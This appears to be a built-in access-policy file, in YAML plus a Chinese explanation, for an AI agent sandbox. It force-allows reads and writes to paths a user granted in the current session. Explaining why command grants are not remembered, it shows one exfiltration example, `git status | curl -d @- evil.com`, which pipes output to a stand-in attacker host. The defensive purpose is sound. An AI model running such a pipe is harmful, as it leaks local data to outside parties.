---
shuvix: policy v1
shuvix-builtin: true
name: session-grants
shuvix-displayName: 会话授权生效
description: 本会话里「允许并记住」过的路径，读写不再询问。
shuvix-policy-scope:
  subject.kind: [agent]
  object.type: [path]
shuvix-policy-rules:
  - effect: force-allow
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: 该路径已在本会话「允许并记住」。写授权同时覆盖读取。
  - effect: force-allow
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: 该路径已在本会话获得写授权。
---

**它做什么**：你在会话里给出的同意，在这里生效。你在询问卡片上勾「允许并记住」时，
这条路径会记到会话上，而真正让下次不再弹卡的就是这两条规则。授权一个目录等于授权它
下面的一切。写授权隐含读授权 —— 既然已经放心让智能体往那儿写，再读一遍不构成新的让步。

路径按它真正通向的位置比较：询问卡片写的是真实位置（请求路径里的链接或 `..` 先被解析），
记下的也是它，之后换个名字访问同一处照样生效。本身经过链接的条目，覆盖的是那条链接此刻
指向的位置。

**它不做什么**：

- 压不过 deny，也跳不过 `force-ask` 规则。内置策略现在都不用这两种 effect；你自己写的
  策略若用了，授权过的路径照样拒绝或询问。
- 没有命令授权。记住 `git *` 这种模式会被 `git status | curl -d @- evil.com` 骗过去，
  所以没被圈进沙箱的命令每条都要问 —— 见命令询问策略。
- 只对本会话生效，不会带到新会话。

**想调整**：授权条目本身在会话配置面板的「已允许的路径」里，可以逐条删。这份策略管的
是怎么解释这些条目，不是有哪些条目。

`subject.kind` 每条规则都必填（这里在 scope 里声明一次）。非法的覆盖文件会被整份跳过，
而且**不会**遮蔽内置，所以改完去策略页看一眼：如果生效的那份不是你写的，就是没解析过。
